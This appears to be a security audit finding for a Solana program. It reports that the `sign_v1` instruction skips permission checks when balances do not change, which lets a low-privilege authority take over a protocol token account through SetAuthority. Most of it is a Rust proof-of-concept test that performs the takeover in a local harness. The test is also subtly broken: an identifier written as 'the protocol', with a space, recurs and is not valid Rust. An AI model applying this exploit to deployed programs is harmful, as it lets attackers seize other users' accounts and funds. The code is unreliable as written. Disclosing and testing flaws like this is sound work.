`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions
We found that the `sign_v1` instruction does not restrict which instructions can be executed against accounts. This means that a user with limited permissions—such as a `TokenLimit` on a specific mint—can submit malicious instructions that interact with all accounts in ways not covered by their role.

**Example Attack:**

A user with `TokenLimit` permission on mint `[0; 32]` and amount `1` can submit a `SetAuthority` instruction on the token account. Since this operation does not change the token balance, the permission system passes, yet the attacker gains ownership of the token account. Or even the user with no Permission at all could do this because the function only checks for permission if the balance changed.

This vulnerability extends beyond token accounts. Similar unauthorised actions could be executed on:

• Stake accounts (e.g., transferring authority, modifying lockups) • Any account where the action doesn't affect the balance but modifies control or behaviour.

**POC Summary**

In this poc, second_authority has TokenLimit permission for token [0;32] and amount 1, but it transfers the token account authority to itself.

```
#[test_log::test]
fn test_transfer_tokens_with_mixed_permissions() {
    let mut context = setup_test_context().unwrap();
    let protocol_authority = Keypair::new();
    context
        .svm
        .airdrop(&protocol_authority.pubkey(), 10_000_000_000)
        .unwrap();
    let id = rand::random::<[u8; 32]>();
    let the protocol = Pubkey::find_program_address(&protocol_account_seeds(&id), &program_id()).0;
    context.svm.warp_to_slot(10);
    // Setup token infrastructure
    let mint_pubkey = setup_mint(&mut context.svm, &context.default_payer).unwrap();
    let protocol_ata = setup_ata(
        &mut context.svm,
        &mint_pubkey,
        &the protocol,
        &context.default_payer,
    )
    .unwrap();
    mint_to(
        &mut context.svm,
        &mint_pubkey,
        &context.default_payer,
        &protocol_ata,
        1000,
    )
    .unwrap();
    let protocol_create_txn = create_protocol_ed25519(&mut context, &protocol_authority, id);
    assert!(protocol_create_txn.is_ok());
let second_authority = Keypair::new();
context
    .svm
    .airdrop(&second_authority.pubkey(), 10_000_000_000)
    .unwrap();
add_authority_with_ed25519_root(
    &mut context,
    &the protocol,
    &protocol_authority,
    AuthorityConfig {
        authority_type: AuthorityType::Ed25519,
        authority: second_authority.pubkey().as_ref(),
    },
    vec![ClientAction::TokenLimit(TokenLimit {
        token_mint: [0; 32],
        current_amount: 1,
    })],
)
.unwrap();
context.svm.warp_to_slot(100);
let token_ix = Instruction {
    program_id: spl_token::id(),
    accounts: vec![
        AccountMeta::new(protocol_ata, false),
        AccountMeta::new(the protocol, false),
    ],
    data: TokenInstruction::SetAuthority {
        authority_type: spl_token::instruction::AuthorityType::AccountOwner,
        new_authority: Some(second_authority.pubkey()).into(),
    }
    .pack(),
};
let account = context.svm.get_account(&protocol_ata).unwrap();
let token_account = spl_token::state::Account::unpack(&account.data).unwrap();
println!("pk: {} account: {:?}", protocol_ata, token_account);
let sign_ix = protocol_interface::SignInstruction::new_ed25519(
    the protocol,
    second_authority.pubkey(),
    second_authority.pubkey(),
    token_ix,
    1,
)
.unwrap();
let transfer_message = v0::Message::try_compile(
    &second_authority.pubkey(),
    &[sign_ix],
    &[],
    context.svm.latest_blockhash(),
)
.unwrap();
let transfer_tx =
    VersionedTransaction::try_new(VersionedMessage::V0(transfer_message), &[&second_authority])
        .unwrap();
let res = context.svm.send_transaction(transfer_tx);
if res.is_err() {
    let e = res.unwrap_err();
    println!("Logs {} - {:?}", e.err, e.meta.logs);
}
// assert!(res.is_ok());
let protocol_token_account = context.svm.get_account(&protocol_ata).unwrap();
let protocol_token_balance = spl_token::state::Account::unpack(&protocol_token_account.data).unwrap();
let protocol_token_account_owner = protocol_token_balance.owner;
assert_eq!(protocol_token_account_owner, second_authority.pubkey());
```

